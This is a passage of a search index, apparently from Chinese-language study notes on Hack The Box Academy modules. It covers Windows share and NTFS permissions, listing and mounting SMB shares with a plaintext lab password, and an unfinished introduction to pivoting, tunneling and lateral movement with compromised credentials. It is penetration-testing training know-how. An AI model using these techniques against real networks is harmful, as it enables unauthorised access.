\u7531<code>users</code>&amp;\u00a0<code>groups</code>\uff08\u4e5f\u79f0\u4e3a\u5b89\u5168\u4e3b\u4f53\uff09\u7ec4\u6210\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f\u7ba1\u7406\u548c\u8ddf\u8e2a\u5bf9\u5171\u4eab\u8d44\u6e90\u7684\u8bbf\u95ee\u7684\u5408\u9002\u673a\u5236\u3002</p> <p>\u8bf7\u6ce8\u610f\u9ed8\u8ba4\u7684\u8bbf\u95ee\u63a7\u5236\u6761\u76ee\u548c\u6743\u9650\u8bbe\u7f6e\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#acl","title":"\u5171\u4eab\u6743\u9650 ACL\uff08\u5171\u4eab\u9009\u9879\u5361\uff09","text":"<p>![[Pasted image 20221025152141.png]]</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u5c06\u5e94\u7528\u8fd9\u4e9b\u8bbe\u7f6e\u6765\u6d4b\u8bd5\u6b64 ACL \u7684\u6548\u679c\u4ee5\u53ca\u6309\u539f\u6837\u5e94\u7528\u7684\u6743\u9650\u3002\u6211\u4eec\u5c06\u901a\u8fc7\u6253\u5f00\u7ec8\u7aef\u5e76\u4f7f\u7528<code>smbclient</code>.</p> <p>\u6ce8\u610f\uff1a\u4ece\u6280\u672f\u4e0a\u8bb2\uff0c\u670d\u52a1\u5668\u662f\u4e00\u79cd\u7528\u4e8e\u670d\u52a1\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u8f6f\u4ef6\u529f\u80fd\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cPwnbox \u662f\u6211\u4eec\u7684\u5ba2\u6237\u7aef\uff0cWindows 10 \u76ee\u6807\u6846\u662f\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#smbclient","title":"\u4f7f\u7528 smbclient \u8fde\u63a5\u5230\u5171\u4eab","text":"<p>\u4f7f\u7528 smbclient \u8fde\u63a5\u5230\u5171\u4eab</p> <pre><code>darkinga@htb[/htb]$ smbclient -L IPaddressOfTarget -U htb-student\nEnter WORKGROUP\\htb-student's password: \n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    Company Data    Disk      \n    IPC$            IPC       Remote IPC\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u7684\u6240\u6709\u6761\u76ee\u90fd\u662f\u6b63\u786e\u7684\u5e76\u4e14\u6211\u4eec\u7684\u6743\u9650\u5217\u8868\u4e2d\u7684 Everyone \u7ec4\u81f3\u5c11\u5177\u6709\u8bfb\u53d6\u6743\u9650\uff0c\u90a3\u4e48\u6709\u4ec0\u4e48\u53ef\u80fd\u4f1a\u963b\u6b62\u6211\u4eec\u8bbf\u95ee\u6b64\u5171\u4eab\uff1f</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#windows-defender","title":"Windows Defender \u9632\u706b\u5899\u6ce8\u610f\u4e8b\u9879","text":"<p>Windows Defender \u9632\u706b\u5899\u53ef\u80fd\u4f1a\u963b\u6b62\u5bf9 SMB \u5171\u4eab\u7684\u8bbf\u95ee\u3002\u7531\u4e8e\u6211\u4eec\u662f\u4ece\u57fa\u4e8e Linux \u7684\u7cfb\u7edf\u8fde\u63a5\u7684\uff0c\u56e0\u6b64\u9632\u706b\u5899\u5df2\u963b\u6b62\u6765\u81ea\u4efb\u4f55\u672a\u52a0\u5165\u540c\u4e00<code>workgroup</code>.\u00a0\u540c\u6837\u91cd\u8981\u7684\u662f\u8981\u6ce8\u610f\uff0c\u5f53 Windows \u7cfb\u7edf\u662f\u5de5\u4f5c\u7ec4\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u6240\u6709<code>netlogon</code>\u8bf7\u6c42\u90fd\u9488\u5bf9\u8be5\u7279\u5b9a Windows \u7cfb\u7edf\u7684<code>SAM</code>\u6570\u636e\u5e93\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u5f53 Windows \u7cfb\u7edf\u52a0\u5165 Windows \u57df\u73af\u5883\u65f6\uff0c\u6240\u6709 netlogon \u8bf7\u6c42\u90fd\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1<code>Active Directory</code>.\u00a0\u5de5\u4f5c\u7ec4\u548c Windows \u57df\u5728\u8eab\u4efd\u9a8c\u8bc1\u65b9\u9762\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8e\uff0c\u5de5\u4f5c\u7ec4\u4f7f\u7528\u672c\u5730 SAM \u6570\u636e\u5e93\uff0c\u800c\u5728 Windows \u57df\u4e2d\u4f7f\u7528\u57fa\u4e8e\u7f51\u7edc\u7684\u96c6\u4e2d\u5f0f\u6570\u636e\u5e93 (Active Directory)\u3002\u5728\u5c1d\u8bd5\u4f7f\u7528 Windows \u7cfb\u7edf\u767b\u5f55\u548c\u9a8c\u8bc1\u65f6\uff0c\u6211\u4eec\u5fc5\u987b\u77e5\u9053\u8fd9\u4e9b\u4fe1\u606f\u3002\u8003\u8651\u6258\u7ba1 htb-student \u5e10\u6237\u7684\u4f4d\u7f6e\u4ee5\u6b63\u786e\u8fde\u63a5\u5230\u76ee\u6807\u3002</p> <p>\u5728\u9632\u706b\u5899\u963b\u6b62\u8fde\u63a5\u65b9\u9762\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u5b8c\u5168\u505c\u7528 Windows \u4e2d\u7684\u6bcf\u4e2a\u9632\u706b\u5899\u914d\u7f6e\u6587\u4ef6\u6216\u901a\u8fc7\u5728<code>Windows Defender Firewall advanced security settings</code>.\u00a0\u4e0e\u5927\u591a\u6570\u9632\u706b\u5899\u4e00\u6837\uff0cWindows Defender \u9632\u706b\u5899\u5141\u8bb8\u6216\u62d2\u7edd\u6d41\u91cf\uff08\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4e3a\u8bbf\u95ee\u548c\u8fde\u63a5\u8bf7\u6c42\uff09\u6d41\u52a8<code>inbound</code>\u548c/\u6216<code>outbound</code></p> <p>\u4e0d\u540c\u7684\u5165\u7ad9\u548c\u51fa\u7ad9\u89c4\u5219\u4e0e\u9632\u5fa1\u8005\u4e2d\u4e0d\u540c\u7684\u9632\u706b\u5899\u914d\u7f6e\u6587\u4ef6\u76f8\u5173\u8054\u3002</p> <p>Windows Defender \u9632\u706b\u5899\u914d\u7f6e\u6587\u4ef6\uff1a</p> <ul> <li><code>Public</code></li> <li><code>Private</code></li> <li><code>Domain</code></li> </ul> <p>\u6700\u4f73\u505a\u6cd5\u662f\u542f\u7528\u9884\u5b9a\u4e49\u89c4\u5219\u6216\u6dfb\u52a0\u81ea\u5b9a\u4e49\u4f8b\u5916\uff0c\u800c\u4e0d\u662f\u5b8c\u5168\u505c\u7528\u9632\u706b\u5899\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u4e3a\u4e86\u65b9\u4fbf\u6216\u7f3a\u4e4f\u7406\u89e3\uff0c\u5c06\u9632\u706b\u5899\u5b8c\u5168\u505c\u7528\u662f\u5f88\u5e38\u89c1\u7684\u3002\u5f53\u901a\u8fc7\u4f7f\u7528\u7ec4\u7b56\u7565\u52a0\u5165 Windows \u57df\u73af\u5883\u65f6\uff0c\u53ef\u4ee5\u96c6\u4e2d\u7ba1\u7406\u684c\u9762\u7cfb\u7edf\u4e0a\u7684\u9632\u706b\u5899\u89c4\u5219\u3002\u7ec4\u7b56\u7565\u6982\u5ff5\u548c\u914d\u7f6e\u8d85\u51fa\u4e86\u672c\u6a21\u5757\u7684\u8303\u56f4\u3002</p> <p>\u542f\u7528\u6b63\u786e\u7684<code>inbound</code>\u9632\u706b\u5899\u89c4\u5219\u540e\uff0c\u6211\u4eec\u5c06\u6210\u529f\u8fde\u63a5\u5230\u5171\u4eab\u3002\u8bf7\u8bb0\u4f4f\uff0c\u6211\u4eec\u53ea\u80fd\u8fde\u63a5\u5230\u5171\u4eab\uff0c\u56e0\u4e3a\u6211\u4eec\u4f7f\u7528\u7684\u7528\u6237\u5e10\u6237 (\u00a0<code>htb-student</code>) \u4f4d\u4e8e<code>Everyone group</code>.\u00a0\u56de\u60f3\u4e00\u4e0b\uff0c\u6211\u4eec\u5c06\u201c\u6240\u6709\u4eba\u201d\u7ec4\u7684\u7279\u5b9a\u5171\u4eab\u6743\u9650\u8bbe\u7f6e\u4e3a\u201c\u8bfb\u53d6\u201d\uff0c\u8fd9\u5b9e\u9645\u4e0a\u610f\u5473\u7740\u6211\u4eec\u5c06\u53ea\u80fd\u8bfb\u53d6\u8be5\u5171\u4eab\u4e0a\u7684\u6587\u4ef6\u3002\u4e00\u65e6\u4e0e\u5171\u4eab\u5efa\u7acb\u8fde\u63a5\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5<code>mount point</code>\u4ece\u6211\u4eec\u7684 Pwnbox \u5230 Windows 10 \u76ee\u6807\u6846\u7684\u6587\u4ef6\u7cfb\u7edf\u521b\u5efa\u4e00\u4e2a\u3002\u8fd9\u662f\u6211\u4eec\u8fd8\u5fc5\u987b\u8003\u8651 NTFS \u6743\u9650\u4e0e\u5171\u4eab\u6743\u9650\u4e00\u8d77\u5e94\u7528\u7684\u5730\u65b9\u3002\u56de\u60f3\u4e00\u4e0b\uff0cNTFS \u662f Windows \u4e2d\u7684\u9ed8\u8ba4\u6587\u4ef6\u7cfb\u7edf\u3002\u8ba9\u6211\u4eec\u56de\u5230\u4f7f\u7528 Windows 10 \u76ee\u6807\u6846\u7684 xfreerdp \u4f1a\u8bdd\uff0c\u5e76\u67e5\u770b\u516c\u53f8\u6570\u636e\u6587\u4ef6\u5939\u7684 NTFS \u6743\u9650\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#ntfs-acl","title":"NTFS \u6743\u9650 ACL\uff08\u5b89\u5168\u9009\u9879\u5361\uff09","text":"<p>\u53ef\u4ee5\u5bf9\u7528\u6237\u548c\u7ec4\u5e94\u7528 NTFS \u6743\u9650\u8fdb\u884c\u66f4\u7cbe\u7ec6\u7684\u63a7\u5236\u3002\u6bcf\u5f53\u6211\u4eec\u770b\u5230\u6743\u9650\u65c1\u8fb9\u7684\u7070\u8272\u590d\u9009\u6807\u8bb0\u65f6\uff0c\u5b83\u90fd\u662f\u4ece\u7236\u76ee\u5f55\u7ee7\u627f\u7684\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709 NTFS \u6743\u9650\u90fd\u7ee7\u627f\u81ea\u7236\u76ee\u5f55\u3002\u5728 Windows \u4e16\u754c\u4e2d\uff0c<code>C:\\ drive</code>\u9664\u975e\u7cfb\u7edf\u7ba1\u7406\u5458\u5728\u65b0\u521b\u5efa\u7684\u6587\u4ef6\u5939\u7684\u9ad8\u7ea7\u5b89\u5168\u8bbe\u7f6e\u4e2d\u7981\u7528\u7ee7\u627f\uff0c\u5426\u5219\u5b83\u662f\u7ba1\u7406\u6240\u6709\u76ee\u5f55\u7684\u7236\u76ee\u5f55\u3002</p> <p>\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u7ec4\u7ec7\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u5c06\u8d1f\u8d23\u51b3\u5b9a\u7528\u6237\u6216\u7528\u6237\u7ec4\u5728\u7f51\u7edc\u8d44\u6e90\u4e0a\u83b7\u5f97\u4ec0\u4e48\u6743\u9650\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8bb8\u591a\u9c7c\u53c9\u5f0f\u7f51\u7edc\u9493\u9c7c\u653b\u51fb\u90fd\u9488\u5bf9\u7cfb\u7edf\u7ba1\u7406\u5458\u548c\u5176\u4ed6 IT \u9886\u5bfc\u8005\u3002\u4ed6\u4eec\u5bf9\u4ed6\u4eec\u76d1\u7763\u7684\u73af\u5883\u4e2d\u5141\u8bb8\u7684\u5185\u5bb9\u6709\u5f88\u5927\u7684\u5f71\u54cd\uff0c\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\u751a\u81f3\u6bd4\u7ec4\u7ec7\u7684\u975e\u6280\u672f c \u7ea7\u9886\u5bfc\u8005\u66f4\u91cd\u8981\u3002\u4f8b\u5982\uff0c\u5728\u533b\u9662\u5de5\u4f5c\u7684\u533b\u751f\u6216\u884c\u653f\u4eba\u5458\u5c06\u6ca1\u6709\u7f51\u7edc\u7ba1\u7406\u6743\u9650\uff0c\u4f46\u7cfb\u7edf\u7ba1\u7406\u5458\u5c06\u62e5\u6709\u3002</p> <p>\u73b0\u5728\u8ba9\u6211\u4eec<code>Full control</code>\u5728\u5171\u4eab\u7ea7\u522b\u7ed9\u6bcf\u4e2a\u4eba\u7ec4\uff0c\u5e76\u901a\u8fc7\u5c1d\u8bd5\u4ece\u6211\u4eec\u7684 Pwnbox \u7684\u684c\u9762\u521b\u5efa\u5230\u5171\u4eab\u7684\u6302\u8f7d\u70b9\u6765\u6d4b\u8bd5\u66f4\u6539\u7684\u5f71\u54cd</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_9","title":"\u5b89\u88c5\u5230\u5171\u4eab","text":"<p>\u5b89\u88c5\u5230\u5171\u4eab</p> <pre><code>darkinga@htb[/htb]$ sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/\"Company Data\" /home/user/Desktop/\n</code></pre> <p>\u5982\u679c\u6b64\u547d\u4ee4\u4e0d\u8d77\u4f5c\u7528\uff0c\u8bf7\u68c0\u67e5\u8bed\u6cd5\u3002\u5982\u679c\u8bed\u6cd5\u6b63\u786e\u4f46\u547d\u4ee4\u4ecd\u7136\u6709\u6548\uff0c<code>cifs-utils</code>\u5219\u53ef\u80fd\u9700\u8981\u5b89\u88c5\u3002\u8fd9\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b8c\u6210\uff1a</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#cifs","title":"\u5b89\u88c5 CIFS \u5b9e\u7528\u7a0b\u5e8f","text":"<p>\u5b89\u88c5 CIFS \u5b9e\u7528\u7a0b\u5e8f</p> <pre><code>darkinga@htb[/htb]$ sudo apt-get install cifs-utils\n</code></pre> <p>\u4e00\u65e6\u6211\u4eec\u5728 Pwnbox \u7684\u684c\u9762\u4e0a\u6210\u529f\u521b\u5efa\u4e86\u6302\u8f7d\u70b9\uff0c\u6211\u4eec\u5e94\u8be5\u770b\u770b Windows \u5185\u7f6e\u7684\u51e0\u4e2a\u5de5\u5177\uff0c\u5b83\u4eec\u53ef\u4ee5\u8ba9\u6211\u4eec\u8ddf\u8e2a\u548c\u76d1\u63a7\u6211\u4eec\u6240\u505a\u7684\u4e8b\u60c5\u3002</p> <p>\u8be5<code>net share</code>\u547d\u4ee4\u5141\u8bb8\u6211\u4eec\u67e5\u770b\u7cfb\u7edf\u4e0a\u7684\u6240\u6709\u5171\u4eab\u6587\u4ef6\u5939\u3002\u8bf7\u6ce8\u610f\u6211\u4eec\u521b\u5efa\u7684\u5171\u4eab\u4ee5\u53ca C:\\ \u9a71\u52a8\u5668\u3002</p> <p><code>Do you remember us sharing the C:\\ drive?</code></p> <p>\u6211\u4eec\u6ca1\u6709\u624b\u52a8\u5171\u4eab C:\u3002Windows \u7cfb\u7edf\u4e0a\u5305\u542b\u6700\u5173\u952e\u6587\u4ef6\u7684\u6700\u91cd\u8981\u9a71\u52a8\u5668\u5728\u5b89\u88c5\u65f6\u901a\u8fc7 SMB \u5171\u4eab\u3002\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u62e5\u6709\u9002\u5f53\u8bbf\u95ee\u6743\u9650\u7684\u4eba\u90fd\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u7f51\u7edc\u4e0a\u6bcf\u4e2a Windows \u7cfb\u7edf\u7684\u6574\u4e2a C:\\\u3002</p> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u521b\u5efa\u7684\u5171\u4eab\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_10","title":"\u4f7f\u7528\u51c0\u4efd\u989d\u663e\u793a\u4efd\u989d","text":"<p>\u4f7f\u7528\u51c0\u4efd\u989d\u663e\u793a\u4efd\u989d</p> <pre><code>C:\\Users\\htb-student&gt; net share\n\nShare name   Resource                        Remark\n\n-------------------------------------------------------------------------------\nC$           C:\\                             Default share\nIPC$                                         Remote IPC\nADMIN$       C:\\WINDOWS                      Remote Admin\nCompany Data C:\\Users\\htb-student\\Desktop\\Company Data\n\nThe command completed successfully.\n</code></pre> <p><code>Computer Management</code>\u662f\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u8bc6\u522b\u548c\u76d1\u89c6 Windows \u7cfb\u7edf\u4e0a\u7684\u5171\u4eab\u8d44\u6e90\u7684\u53e6\u4e00\u4e2a\u5de5\u5177\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_11","title":"\u4ece\u8ba1\u7b97\u673a\u7ba1\u7406\u76d1\u63a7\u5171\u4eab","text":"<p><code>Shares</code>\u6211\u4eec\u53ef\u4ee5\u5728\u3001<code>Sessions</code>\u548c\u4e2d\u56db\u5904<code>Open Files</code>\u5bfb\u627e\uff0c\u4ee5\u4e86\u89e3\u8fd9\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u54ea\u4e9b\u4fe1\u606f\u3002\u5982\u679c\u51fa\u73b0\u6211\u4eec\u534f\u52a9\u4e2a\u4eba\u6216\u7ec4\u7ec7\u5e94\u5bf9\u4e0e SMB \u76f8\u5173\u7684\u8fdd\u89c4\u884c\u4e3a\u7684\u60c5\u51b5\uff0c\u8fd9\u4e9b\u662f\u68c0\u67e5\u5e76\u5f00\u59cb\u4e86\u89e3\u8fdd\u89c4\u884c\u4e3a\u5982\u4f55\u53d1\u751f\u4ee5\u53ca\u53ef\u80fd\u7559\u4e0b\u7684\u5185\u5bb9\u7684\u597d\u5730\u65b9\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_12","title":"\u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\u67e5\u770b\u5171\u4eab\u8bbf\u95ee\u65e5\u5fd7","text":"<p><code>Event Viewer</code>\u662f\u8c03\u67e5\u5728 Windows \u4e0a\u5b8c\u6210\u7684\u64cd\u4f5c\u7684\u53e6\u4e00\u4e2a\u597d\u5730\u65b9\u3002\u51e0\u4e4e\u6bcf\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u90fd\u6709\u4e00\u4e2a\u65e5\u5fd7\u8bb0\u5f55\u673a\u5236\u548c\u4e00\u4e2a\u5b9e\u7528\u7a0b\u5e8f\u6765\u67e5\u770b\u6355\u83b7\u7684\u65e5\u5fd7\u3002\u8981\u77e5\u9053\uff0c\u65e5\u5fd7\u5c31\u50cf\u8ba1\u7b97\u673a\u7684\u65e5\u8bb0\u6761\u76ee\uff0c\u8ba1\u7b97\u673a\u5728\u5176\u4e2d\u8bb0\u4e0b\u6240\u6709\u5df2\u6267\u884c\u7684\u64cd\u4f5c\u4ee5\u53ca\u4e0e\u8be5\u64cd\u4f5c\u76f8\u5173\u7684\u5927\u91cf\u8be6\u7ec6\u4fe1\u606f\u3002\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u5728\u8bbf\u95ee Windows 10 \u76ee\u6807\u6846\u65f6\u4ee5\u53ca\u5728\u521b\u5efa\u3001\u7f16\u8f91\u548c\u8bbf\u95ee\u5171\u4eab\u6587\u4ef6\u5939\u65f6\u6267\u884c\u7684\u6bcf\u4e2a\u64cd\u4f5c\u6240\u521b\u5efa\u7684\u65e5\u5fd7\u3002</p> <p></p>"},{"location":"Windows/%E6%BD%9C%E6%B0%B4%E6%9B%B4%E6%B7%B1%E5%B9%B6%E5%85%B3%E9%97%AD%28Diving%20Deeper%20%26%20Close%20Out%29/","title":"\u6f5c\u6c34\u66f4\u6df1\u5e76\u5173\u95ed(Diving Deeper & Close Out)","text":""},{"location":"Windows/%E6%BD%9C%E6%B0%B4%E6%9B%B4%E6%B7%B1%E5%B9%B6%E5%85%B3%E9%97%AD%28Diving%20Deeper%20%26%20Close%20Out%29/#diving-deeper-close-out","title":"\u6f5c\u6c34\u66f4\u6df1\u5e76\u5173\u95ed(Diving Deeper &amp; Close Out)","text":""},{"location":"Windows/%E6%BD%9C%E6%B0%B4%E6%9B%B4%E6%B7%B1%E5%B9%B6%E5%85%B3%E9%97%AD%28Diving%20Deeper%20%26%20Close%20Out%29/#_1","title":"\u684c\u9762\u4f53\u9a8c\u4e0e\u670d\u52a1\u5668\u6838\u5fc3","text":""},{"location":"Windows/%E6%BD%9C%E6%B0%B4%E6%9B%B4%E6%B7%B1%E5%B9%B6%E5%85%B3%E9%97%AD%28Diving%20Deeper%20%26%20Close%20Out%29/#windows","title":"Windows\u5b89\u5168","text":""},{"location":"Windows/%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BD%BF%E7%94%A8Windows/","title":"\u8fdb\u4e00\u6b65\u4f7f\u7528Windows","text":""},{"location":"Windows/%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BD%BF%E7%94%A8Windows/#windows","title":"\u8fdb\u4e00\u6b65\u4f7f\u7528Windows","text":""},{"location":"Windows/%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BD%BF%E7%94%A8Windows/#mmc","title":"\u5fae\u8f6f\u7ba1\u7406\u63a7\u5236\u53f0(MMC)","text":""},{"location":"Windows/%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BD%BF%E7%94%A8Windows/#linux-windows-wsl","title":"\u9002\u7528\u4e8eLinux \u7684Windows \u5b50\u7cfb\u7edf (WSL)","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/","title":"Pivoting(\u65cb\u8f6c), Tunneling(\u96a7\u9053), and Port Forwarding(\u7aef\u53e3\u8f6c\u53d1)","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#_1","title":"\u7b80\u4ecb","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#introduction-to-pivoting-tunneling-and-port-forwarding","title":"Introduction to Pivoting, Tunneling, and Port Forwarding","text":"<p>\u5728\u7ea2\u961f\u53c2\u4e0e\u3001\u6e17\u900f\u6d4b\u8bd5\u6216 Active Directory \u8bc4\u4f30\u671f\u95f4\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u53d1\u73b0\u81ea\u5df1\u53ef\u80fd\u5df2\u7ecf compromised(\u62ff\u4e0b) \u4e86\u6240\u9700\u7684\u51ed\u636e\u3001ssh \u5bc6\u94a5\u3001\u54c8\u5e0c\u6216\u8bbf\u95ee\u4ee4\u724c\u4ee5\u79fb\u52a8\u5230\u53e6\u4e00\u53f0\u4e3b\u673a\uff0c\u4f46\u53ef\u80fd\u6709 \u4e0d\u80fd\u4ece\u6211\u4eec\u7684\u653b\u51fb\u4e3b\u673a\u76f4\u63a5\u8bbf\u95ee\u7684\u5176\u4ed6\u4e3b\u673a\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u6211\u4eec\u5df2\u7ecf compromised \u7684 <code>pivot host</code> \u6765\u627e\u5230\u901a\u5f80\u4e0b\u4e00\u4e2a\u76ee\u6807\u7684\u65b9\u6cd5\u3002 \u9996\u6b21\u767b\u9646\u4e3b\u673a\u65f6\u8981\u505a\u7684\u6700\u91cd\u8981\u7684\u4e8b\u60c5\u4e4b\u4e00\u662f\u68c0\u67e5\u6211\u4eec\u7684\u6743\u9650\u7ea7\u522b\u3001\u7f51\u7edc\u8fde\u63a5\u548c\u6f5c\u5728\u7684 VPN \u6216\u5176\u4ed6\u8fdc\u7a0b\u8bbf\u95ee\u8f6f\u4ef6\u3002 \u5982\u679c\u4e00\u53f0\u4e3b\u673a\u6709\u591a\u4e2a\u7f51\u7edc\u9002\u914d\u5668\uff0c\u6211\u4eec\u5f88\u53ef\u80fd\u4f1a\u4f7f\u7528\u5b83\u6765\u79fb\u52a8\u5230\u4e0d\u540c\u7684\u7f51\u6bb5\u3002 <code>pivoting</code>\u672c\u8d28\u4e0a\u662f\u901a\u8fc7\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u79fb\u52a8\u5230\u5176\u4ed6\u7f51\u7edc\u4ee5\u5728\u4e0d\u540c\u7f51\u6bb5\u4e0a\u627e\u5230\u66f4\u591a\u76ee\u6807\u7684\u60f3\u6cd5\u3002</p> <p>\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u672f\u8bed\u7528\u4e8e\u63cf\u8ff0\u53d7\u611f\u67d3\u7684\u4e3b\u673a\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\u6765 <code>pivot</code> \u4ee5\u524d\u65e0\u6cd5\u8bbf\u95ee\u7684\u7f51\u6bb5\u3002\u4e00\u4e9b\u6700\u5e38\u89c1\u7684\u662f\uff1a</p> <ul> <li><code>Pivot Host</code></li> <li><code>Proxy</code></li> <li><code>Foothold</code></li> <li><code>Beach Head system</code></li> <li><code>Jump Host</code></li> </ul> <p>Pivoting \u7684\u4e3b\u8981\u7528\u9014\u662f\u6253\u7834\u5206\u6bb5\uff08\u7269\u7406\u548c\u865a\u62df\uff09\u4ee5\u8bbf\u95ee\u9694\u79bb\u7f51\u7edc\u3002\u53e6\u4e00\u65b9\u9762\uff0cTunneling \u662f\u65cb\u8f6c\u7684\u4e00\u4e2a\u5b50\u96c6\u3002\u96a7\u9053\u5c06\u7f51\u7edc\u6d41\u91cf\u5c01\u88c5\u5230\u53e6\u4e00\u4e2a\u534f\u8bae\u4e2d\u5e76\u901a\u8fc7\u5b83\u8def\u7531\u6d41\u91cf\u3002\u53ef\u4ee5\u8fd9\u6837\u60f3\uff1a</p> <p>We have a <code>key</code> we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.</p> <p>Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.</p> <p>We will inevitably come across several different terms used to describe the same thing in IT &amp; the Infosec industry. With pivoting, we will notice that this is often referred to as <code>Lateral Movement</code>.</p> <pre><code>Isn't it the same thing as pivoting?\n</code></pre> <p>The answer to that is not exactly. Let's take a second to compare and contrast <code>Lateral Movement</code> with <code>Pivoting and Tunneling</code>, as there can be some confusion as to why some consider them different concepts.</p>"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#lateral-movement-pivoting-and-tunneling-compared","title":"Lateral Movement, Pivoting, and Tunneling Compared","text":""},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Pivoting%28%E6%97%8B%E8%BD%AC%29%2C%20Tunneling%28%E9%9A%A7%E9%81%93%29%2C%20and%20Port%20Forwarding%28%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%29/#lateral-movement","title":"Lateral Movement","text":"<p>Lateral movement can be described as a technique used to further our access to additional <code>hosts</code>, <code>applications</code>, and <code>services</code> within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts. In addition to the explanation we have provided for this concept, we can also study how other respected organizations explain Lateral Movement. Check out these two explanations when time permits:</p> <p>Palo Alto Network's Explanation</p> <p>MITRE's Explanation</p> <p>One practical example of <code>Lateral Movement</code> would be:</p> <p>During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain 